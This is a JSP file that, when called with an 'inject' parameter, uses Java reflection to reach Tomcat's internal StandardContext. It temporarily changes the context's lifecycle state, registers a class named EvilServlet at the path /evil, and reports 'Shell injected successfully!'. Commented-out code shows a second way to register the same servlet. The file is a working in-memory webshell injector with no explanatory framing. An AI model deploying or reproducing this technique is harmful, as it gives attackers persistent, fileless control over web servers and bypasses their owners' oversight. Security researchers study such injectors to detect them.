<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="com.vdt.EvilServlet" %>
<%@ page import="org.apache.catalina.LifecycleState" %>
<%@ page import="org.apache.catalina.util.LifecycleBase" %>

<%
    if (request.getParameter("inject") != null) {
        try {
//            System.exit(1);
            // get StandardContext obj
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();

            Field ctx1Field = ApplicationContextFacade.class.getDeclaredField("context");
            ctx1Field.setAccessible(true);
            ApplicationContext ctx2 = (ApplicationContext) ctx1Field.get(ctx1);
            Field ctx2Field = ApplicationContext.class.getDeclaredField("context");
            ctx2Field.setAccessible(true);
            StandardContext ctx3 = (StandardContext) ctx2Field.get(ctx2);

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(ctx3, LifecycleState.STARTING_PREP);

            ServletRegistration.Dynamic dyn = ctx1.addServlet("evilServlet", new EvilServlet());

            stateField.set(ctx3, LifecycleState.STARTED);

            dyn.addMapping("/evil");

//            // create StandardWrapper obj for the EvilServlet
//            EvilServlet evilServlet = new EvilServlet();
//            StandardWrapper evilWrapper = new StandardWrapper();
//            evilWrapper.setServletName("evilServlet");
//            evilWrapper.setServletClass(evilServlet.getClass().getName());
//            evilWrapper.setServlet(evilServlet);
//
//            // add StandardWrapper obj to 'children' of StandardContext
//            ctx3.addChild(evilWrapper);
//            // add servlet mapping for the EvilServlet
//            ctx3.addServletMappingDecoded("/evil", "evilServlet");
            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>